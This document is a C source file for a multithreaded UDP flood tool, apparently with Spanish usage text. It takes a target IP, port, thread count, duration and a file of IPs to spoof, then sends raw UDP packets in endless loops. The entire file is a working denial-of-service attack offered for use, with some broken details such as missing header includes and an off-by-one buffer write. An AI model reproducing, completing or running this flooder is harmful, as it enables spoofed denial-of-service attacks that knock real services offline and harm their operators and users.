#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>

#define MAX_IP_LENGTH 40
#define BUFFER_SIZE 1024
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
#define MAX_IPS 100

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
static unsigned int udport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
char target_ip[MAX_IP_LENGTH];

void init_rand(unsigned long int x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void) {
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

int randnum(int min_num, int max_num) {
    int result = 0, low_num = 0, hi_num = 0;
    if (min_num < max_num) {
        low_num = min_num;
        hi_num = max_num + 1;
    } else {
        low_num = max_num + 1;
        hi_num = min_num;
    }
    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

unsigned short csum(unsigned short *buf, int count) {
    register unsigned long sum = 0;
    while (count > 1) {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0) {
        sum += *(unsigned char *)buf;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (unsigned short)(~sum);
}

unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph, int psize) {
    struct udp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_UDP;
    pseudohead.length = htons(sizeof(struct udphdr) + psize);
    int totaludp_len = sizeof(struct udp_pseudo) + sizeof(struct udphdr) + psize;
    unsigned short *udp = malloc(totaludp_len);
    memcpy((unsigned char *)udp, &pseudohead, sizeof(struct udp_pseudo));
    memcpy((unsigned char *)udp + sizeof(struct udp_pseudo), (unsigned char *)udph, sizeof(struct udphdr) + psize);
    unsigned short output = csum(udp, totaludp_len);
    free(udp);
    return output;
}

void setup_ip_header(struct iphdr *iph) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = 17;
    iph->check = 0;
}

void setup_udp_header(struct udphdr *udph) {
    udph->source = htons(5678);
    udph->check = 0;
    memcpy((void *)udph + sizeof(struct udphdr), "\x00\x01\x00\x5c\x21\x12\xa4", 7);
    udph->len = htons(sizeof(struct udphdr) + 7);
}

int load_ips(const char *filename, char ips[][MAX_IP_LENGTH], int max_ips) {
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        perror("Error al abrir el archivo");
        return -1;
    }

    int count = 0;
    while (fgets(ips[count], MAX_IP_LENGTH, file) != NULL && count < max_ips) {
        ips[count][strcspn(ips[count], "\n")] = '\0';
        count++;
    }

    fclose(file);
    return count;
}

void *flood(void *par1) {
    char *src_ip = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    int sportne = randnum(55000, 64932);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    int fd = 0;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *) &addr, sizeof(struct sockaddr_in));
    getsockname(fd, (struct sockaddr *) &addr, &addr_len);
    close(fd);

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s < 0) {
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }

    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_udp_header(udph);

    udph->dest = htons(udport);

    iph->saddr = inet_addr(src_ip);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len);

    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    int payload_size = randnum(725, 1000);
    char payloadmsg[] = "<>-ABCZXY:/\\";
    unsigned char payload1[payload_size];
    int mb;
    for (mb = 0; mb <= payload_size; mb++) {
        payload1[mb] = payloadmsg[rand() % 12];
    }

    int sumup = sizeof(struct udphdr) + sizeof(struct iphdr);
    memcpy((void *)udph + sizeof(struct udphdr) + sizeof(struct iphdr), payload1, payload_size);

    init_rand(time(NULL));
    unsigned int packetcounter = 0;
    while (1) {
        if (packetcounter > 500) {
            sportne = randnum(55000, 64932);
            packetcounter = 0;
        } else {
            packetcounter++;
        }
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
        udph->len = htons(sizeof(struct udphdr) + payload_size);
        udph->check = 0;
        udph->dest = htons(udport);
        iph->saddr = inet_addr(src_ip);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->ttl = randnum(64, 128);
        iph->check = csum((unsigned short *)datagram, iph->tot_len);
        udph->source = htons(sportne);
        udph->check = udpcsum(iph, udph, payload_size);
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        pps++;
        usleep(sleeptime);
    }

    close(s);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Uso: %s <IP destino> <Puerto destino> <Número de hilos> <Tiempo> <Archivo IPs>\n", argv[0]);
        return 1;
    }

    strncpy(target_ip, argv[1], MAX_IP_LENGTH);
    floodport = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    char *ips_file = argv[5];

    char ips[MAX_IPS][MAX_IP_LENGTH];
    int num_ips = load_ips(ips_file, ips, MAX_IPS);
    if (num_ips <= 0) {
        return 1;
    }

    pthread_t threads[num_threads];
    for (int i = 0; i < num_threads; i++) {
        int ip_index = i % num_ips;
        pthread_create(&threads[i], NULL, flood, (void *)ips[ip_index]);
    }

    sleep(duration);

    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }

    return 0;
}
